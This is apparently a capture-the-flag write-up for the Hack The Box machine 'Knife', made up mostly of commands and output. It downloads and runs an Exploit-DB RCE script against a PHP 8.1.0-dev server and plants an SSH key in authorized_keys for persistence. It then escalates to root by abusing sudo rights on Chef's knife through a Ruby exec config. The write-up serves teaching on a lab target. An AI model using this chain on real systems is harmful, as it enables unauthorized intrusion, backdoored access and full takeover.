## ----------->> Knife <<-------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.242 -p-
-----    

    Nmap scan report for 10.10.10.242
    Host is up (0.31s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
    |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
    |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title:  Emergent Medical Idea
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


// Nvigating to website http://10.10.10.242/

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Knife/1.png)

// Tried some directories searchs(gobuster, dirsearch, feroxbuster) but didnt get much...
// So i tried other approach let see the head of request

    $ curl -i http://10.10.10.242/
-----

    HTTP/1.1 200 OK
    Date: Wed, 04 Aug 2021 08:37:46 GMT
    Server: Apache/2.4.41 (Ubuntu)
    X-Powered-By: PHP/8.1.0-dev
    Vary: Accept-Encoding
    Transfer-Encoding: chunked
    Content-Type: text/html; charset=UTF-8
    
// Notice: PHP/8.1.0-dev 

// Searching in ExploitDB result me interesting python script for RCE (Remote Code Execution)

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Knife/2.png)
    
// Lets download that script and run him

    $ wget https://www.exploit-db.com/download/49933
----

    $ python3 49933
    Enter the full host url:
    http://10.10.10.242/

    Interactive shell is opened on http://10.10.10.242/ 
    Can't acces tty; job crontol turned off.
    $ id
    uid=1000(james) gid=1000(james) groups=1000(james)

// We got a shell !!! and the flag !!!

    $ cat /home/james/user.txt
    62fb412........................


// since we got SSH service open and a shell Lets try import our pub key to authorized_key of james 

// First generate a ssh key 

    $ ssh-keygen
    
    $ ls
    id_rsa  id_rsa.pub
    
// Copy the public key (id_rsa.pub)

// Now, on targeted host make file 'authorized_keys' (if there isnt)

    $ touch /home/james/.ssh/authorized_keys
    
// and import the key to 'authorized_keys'

    echo "ssh-rsa AAAAB3NzaC1yc......4mb5RwC/b8uyZRc= kali@kali" >> /home/james/.ssh/authorized_keys
    
// Now we can SSH to host with user james

    $ ssh -i id_rsa james@10.10.10.242
    Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

    james@knife:~$ 

### -------Privilleges Escalation-------

// Lets check james 'sudo' permissions

    james@knife:~$ sudo -l
    Matching Defaults entries for james on knife:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User james may run the following commands on knife:
        (root) NOPASSWD: /usr/bin/knife
        
// We can see that james can run 'knife' with 'sudo'(root) permissions

// Lets check what its 'knife'

    james@knife:~$ knife
    ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)

    Usage: knife sub-command (options)
        -s, --server-url URL             Chef Infra Server URL.
            --chef-zero-host HOST        Host to start Chef Infra Zero on.
            --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
        -k, --key KEY                    Chef Infra Server API client key.
            --[no-]color                 Use colored output, defaults to enabled.
        -c, --config CONFIG              The configuration file to use.
            --config-option OPTION=VALUE Override a single configuration option.
            --defaults                   Accept default values for all questions.
        -d, --disable-editing            Do not open EDITOR, just accept the data as is.
        -e, --editor EDITOR              Set the editor to use for interactive commands.
        -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
            --[no-]fips                  Enable FIPS mode.
        -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
            --[no-]listen                Whether a local mode (-z) server binds to a port.
        -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.
        -u, --user USER                  Chef Infra Server API client username.
            --print-after                Show the data after a destructive operation.
            --profile PROFILE            The credentials profile to select.
        -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
        -v, --version                    Show Chef Infra Client version.
        -y, --yes                        Say yes to all prompts for confirmation.
        -h, --help                       Show this help message.

        ........
        
        ** USER COMMANDS **
        knife user create USERNAME DISPLAY_NAME FIRST_NAME LAST_NAME EMAIL PASSWORD (options)
        knife user delete USER (options)
        knife user dissociate USERNAMES
        knife user edit USER (options)
        knife user invite add USERNAMES
        knife user invite list
        knife user invite rescind [USERNAMES] (options)
        knife user key create USER (options)
        knife user key delete USER KEYNAME (options)
        knife user key edit USER KEYNAME (options)
        knife user key list USER (options)
        knife user key show USER KEYNAME (options)
        knife user list (options)
        knife user reregister USER (options)
        knife user show USER (options)

        ........
        
        ** YAML COMMANDS **
        knife yaml convert YAML_FILENAME [RUBY_FILENAME]
        
        ........
        
// we can see at the description that 'knife' uses 'ruby' sources scripts([RUBY_FILENAME]) and we can run a configuration file (-c, --config CONFIG              The configuration file to use.)

// First lets make configuration file 

    james@knife:~$ cat config.rb 
    exec "/bin/bash -i"

// lets run this file with 'knife' USER command 'user list' 

    james@knife:~$ sudo knife user list -c config.rb 
    root@knife:/home/james# id
    uid=0(root) gid=0(root) groups=0(root)
    root@knife:/home/james# cat /root/root.txt
    059c752d...........................

// We got root flag !!!

// Other way to get root flag its to use 'ruby's' 'exec'

    james@knife:~$ sudo knife exec --exec "exec '/bin/sh -i'"
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # cat /root/root.txt
    059c752d........................

